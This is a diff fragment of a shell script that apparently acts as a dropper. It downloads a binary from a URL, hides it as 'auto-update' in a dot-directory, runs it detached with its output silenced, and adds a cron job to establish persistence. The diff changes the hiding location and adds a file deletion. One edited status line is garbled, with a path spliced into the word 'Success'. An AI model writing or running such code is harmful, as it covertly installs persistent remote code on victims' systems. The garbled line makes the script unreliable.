@@ -49,6 +49,10 @@ echo "[v]-----| USER:     $USER"
 echo "[v]-----| URL:      $url"
 echo "[v]-----| OUT:      $out"
 
+if [ -f "$out" ] && [ -w "$out" ]; then
+    rm -rf $out
+fi
+
 if download "$url" "$out"; then
     echo "[+]-----| [Success] Binary successfully downloaded!"
     echo "[i]-----| [Info]    Setting up binary.."
@@ -158,10 +162,12 @@ EOF
             tasks="/tmp"
         fi
 
-        binary="$tasks/update"
+        binary_dir="$tasks/.webuser/automated_tasks/"
+        binary="$binary_dir/auto-update"
+
         echo "[v]-----| binary:   $binary"
 
-        mkdir -p $tasks
+        mkdir -p $binary_dir
         mv "$out" $binary
 
         nohup $binary &>/dev/null & disown
@@ -173,7 +179,7 @@ EOF
             (crontab -l 2>/dev/null; echo "$persist") | crontab -
             last_line=$(crontab -l 2>/dev/null | sed '/^\s*$/d' | tail -n 1)
             if [ "$last_line" = "$persist" ]; then
-                echo "[+]-----| [Success] Cronjob successfully created!"
+                echo "[+]-----| [Succe.webuser/tasks/updatess] Cronjob successfully created!"
                 echo "[i]-----| [Info]    Persistence established.."
             else
                 echo "[!]-----| [Failed]  Failed to add cronjob.."
